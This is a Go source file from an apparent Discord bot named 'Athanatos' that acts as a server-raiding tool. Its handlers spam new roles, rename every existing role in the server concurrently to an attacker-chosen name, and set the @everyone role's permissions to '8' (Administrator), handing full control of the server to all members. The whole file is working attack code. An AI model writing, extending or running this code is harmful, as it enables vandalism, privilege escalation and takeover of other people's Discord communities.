package creating

import (
	"Athanatos/core/requests"
	"encoding/json"
	"math/rand"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func randomInt(min, max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min+1) + min
}

func RolesSpam(s *discordgo.Session, m *discordgo.MessageCreate) {
	godotenv.Load()
	ROLE_NAME := os.Getenv("ROLE_NAME")

	dataMap := map[string]interface{}{"name": string(ROLE_NAME), "type": "0", "color": randomInt(0, 16777215)}
	jsonData, _ := json.Marshal(dataMap)

	requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/roles", "POST", jsonData)
}

func DeleteRoles(s *discordgo.Session, m *discordgo.MessageCreate) {
	godotenv.Load()
	ROLE_NAME := os.Getenv("ROLE_NAME")

	roles, _ := s.GuildRoles(m.GuildID)

	smoothed := requests.Smooth(roles)

	dataMap := map[string]string{"name": string(ROLE_NAME), "type": "0"}
	jsonData, _ := json.Marshal(dataMap)

	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, role := range ch {
			go func(ch *discordgo.Role) {
				defer wg.Done()
				requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/roles/"+ch.ID, "PATCH", jsonData)
			}(role)
		}
		wg.Wait()
		time.Sleep(time.Second)
	}
}

func EditRoles(s *discordgo.Session, m *discordgo.MessageCreate) {
	dataMap := map[string]string{"permissions": "8"}
	jsonData, _ := json.Marshal(dataMap)

	requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/roles/"+m.GuildID, "PATCH", jsonData)
}
